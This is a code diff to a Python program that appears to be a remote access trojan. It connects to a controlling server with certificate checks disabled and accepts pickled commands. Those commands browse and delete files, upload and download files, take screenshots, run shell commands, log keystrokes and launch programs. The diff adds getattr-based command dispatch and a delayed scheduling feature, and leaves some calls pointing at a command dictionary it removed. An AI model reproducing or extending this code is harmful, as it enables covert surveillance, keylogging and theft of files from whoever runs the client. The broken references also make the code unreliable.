@@ -20,32 +20,9 @@ class App():
         self.port = port
         self.password = password
         self.status = "IDLE"
-        self.cmd = CMD()
+        self.cmd = CMD(self)
         self.data_ = None
         self.id = "".join(random.choice(string.ascii_letters + string.digits + string.punctuation) for i in range(15))
-        self.commands = {
-            "cd" : self.cmd.cd,
-            "cwd" : self.cmd.cwd,
-            "ls" : self.cmd.ls,
-            "mkdir" : self.cmd.mkdir,
-            "remove" : self.cmd.remove,
-            "removedir" : self.cmd.removedir,
-            "getfile" : self.cmd.getfile,
-            "sendfile" : self.cmd.sendfile,
-            "zip_" : self.cmd.zip_,
-            "unzip" : self.cmd.unzip,
-            "move" : self.cmd.move,
-            "copyfile" : self.cmd.copyfile,
-            "copydir" : self.cmd.copydir,
-            "screenshot" : self.cmd.screenshot,
-            "cmd" : self.cmd.cmd,
-            "keylogger" : self.cmd.keylogger,
-            "info" : self.cmd.info,
-            "execute" : self.cmd.execute,
-            "close" : self.cmd.close,
-            "help" : self.cmd.help_,
-            }
-
         self.context = ssl.create_default_context()
         self.context.check_hostname = False
         self.context.verify_mode = ssl.CERT_NONE
@@ -73,31 +50,28 @@ class App():
                         print("client selected")
                         self.status = "SELECTED"
                         while self.status != "CLOSED":
-                            try:
-                                header = self.socket.recv(4096).decode().split(":")
-                                type_, size, name = header[0], int(header[1]), header[2]
-                                
-                                bytes_data = b""
-                                while len(bytes_data) < size:
-                                    packet = self.socket.recv(65536)
-                                    if not packet:
-                                        break
-                                    bytes_data += packet
-                                data = pickle.loads(bytes_data)
-                                
-                                #do things
-                                header, data = self.gamberge(type_, name, data)
-                                
-                                data = pickle.dumps(data)
-                                header = header.split(":")
-                                header = f"{header[0]}:{len(data)}:{header[1]}"
-                                
-                                self.socket.send(header.encode()) #send header
-                                time.sleep(0.05)
-                                self.socket.sendall(data) #send data
-                                
-                            except Exception as e:
-                                print(1, e)
+                            header = self.socket.recv(4096).decode().strip().split(":")
+                            type_, size, name = header[0], int(header[1]), header[2]
+                            
+                            bytes_data = b""
+                            while len(bytes_data) < size:
+                                packet = self.socket.recv(min(65536, size - len(bytes_data)))
+                                if not packet:
+                                    raise ConnectionError("connection broken while receiving data")
+                                bytes_data += packet
+                            data = pickle.loads(bytes_data)
+                            
+                            #do things
+                            header, data = self.gamberge(type_, name, data)
+                            
+                            data = pickle.dumps(data)
+                            header = header.split(":")
+                            header = f"{header[0]}:{len(data)}:{header[1]}"
+                            
+                            self.socket.send(header.encode()) #send header
+                            time.sleep(0.05)
+                            self.socket.sendall(data) #send data
+                        
 
                 sock.close()
                 self.socket.close()
@@ -118,19 +92,26 @@ class App():
         
         if type_ == "COMMAND":
             try:
-                parts = shlex.split(data_in)
-                command = parts[0]
-                args = parts[1:]
                 
-                if command in list(self.commands.keys()):
-                    self.cmd.args = args
-                    self.cmd.command = data_in
-                    self.cmd.type = "TEXT"
-                    data, name = self.commands[command]()
-                    header = f"{self.cmd.type}:{name}"
+                if data_in.startswith("schedule"):
+                    threading.Thread(target=self.schedule, args=(data_in, )).start()
+                    header = "TEXT:SCHEDULE"
+                    data = "Done"
                 else:
-                    data = "COMMAND_NOT_VALID"
-                    header = "TEXT:NONE"
+                    parts = shlex.split(data_in)
+                    command = parts[0]
+                    args = parts[1:]
+                    
+                    handler = self.cmd.get_command(command)
+                    if handler:
+                        self.cmd.args = args
+                        self.cmd.command = data_in
+                        self.cmd.type = "TEXT"
+                        data, name = handler()
+                        header = f"{self.cmd.type}:{name}"
+                    else:
+                        data = "COMMAND_NOT_VALID"
+                        header = "TEXT:NONE"
             except Exception as e:
                 data = str(e)
                 header = "TEXT:ERROR"
@@ -140,13 +121,33 @@ class App():
         
         return header, data
     
+    def schedule(self, data):
+        data_ = data[9:]
+        time_ = float(data[0:data_.find(" ")])
+        parts = shlex.split(data_[data_.find(" ") + 1:])
+        command = parts[0]
+        args = parts[1:]
+        
+        time.sleep(time_)
+        
+        self.args = args
+        self.command = command
+        self.commands[command]()
+        
+    
 class CMD():
-    def __init__(self):
+    def __init__(self, controller=None):
+        self.controller = controller
         self.args = []
         self.type = "TEXT"
         self.command = ""
         self.key_listener = None
         self.keys_log = []
+        
+    def get_command(self, command_name):
+        if hasattr(self, command_name):
+            return getattr(self, command_name)
+        return None
         
     def cd(self):
         os.chdir(self.args[0])
@@ -156,7 +157,11 @@ class CMD():
         return os.getcwd(), "GET_CURRENT_DIR"
     
     def ls(self):
-        return os.listdir(os.getcwd()), "LIST_DIR"
+        if len(self.args) == 0:
+            return os.listdir(os.getcwd()), "LIST_DIR"
+        else:
+            path = os.path.join(os.getcwd(), self.args[0])
+            return os.listdir(path), "LIST_DIR"
     
     def mkdir(self):
         os.mkdir(self.args[0])
@@ -172,6 +177,14 @@ class CMD():
         shutil.rmtree(path)
         return "Done", "REMOVE_DIR"
     
+    def ispath(self):
+        path = os.path.join(os.getcwd(), self.args[0])
+        return os.path.exists(path), "IS_PATH"
+    
+    def isdir(self):
+        path = os.path.join(os.getcwd(), self.args[0])
+        return os.path.isdir(path), "IS_DIR"
+    
     def getfile(self):
         with open(self.args[0], "rb") as f:
             data = f.read()
@@ -180,7 +193,7 @@ class CMD():
     
     def sendfile(self):
         with open(f"{os.getcwd()}\{self.args[0]}", "wb") as f:
-            f.write(app.data_)
+            f.write(self.controller.data_)
         return "Done", "SEND_FILE"
     
     def zip_(self):
@@ -202,7 +215,7 @@ class CMD():
         return "Done", "COPY_FILE"
     
     def copydir(self):
-        shutil.copy(self.args[0], self.args[1])
+        shutil.copytree(self.args[0], self.args[1])
         return "Done", "COPY_DIR"
     
     def screenshot(self):
@@ -261,12 +274,16 @@ class CMD():
         os.startfile(path)
         return "Done", "EXECUTE"
     
+    def print_(self):
+        print(self.args)
+        return "Done", "PRINT"
+    
     def close(self):
-        app.status = "CLOSED"
+        self.controller.status = "CLOSED"
         return "Done", "CLOSE"
     
     def help_(self):
-        return list(app.commands.keys()), "HELP"
+        return list(self.controller.commands.keys()), "HELP"
     
     def on_press(self, key):
         try:
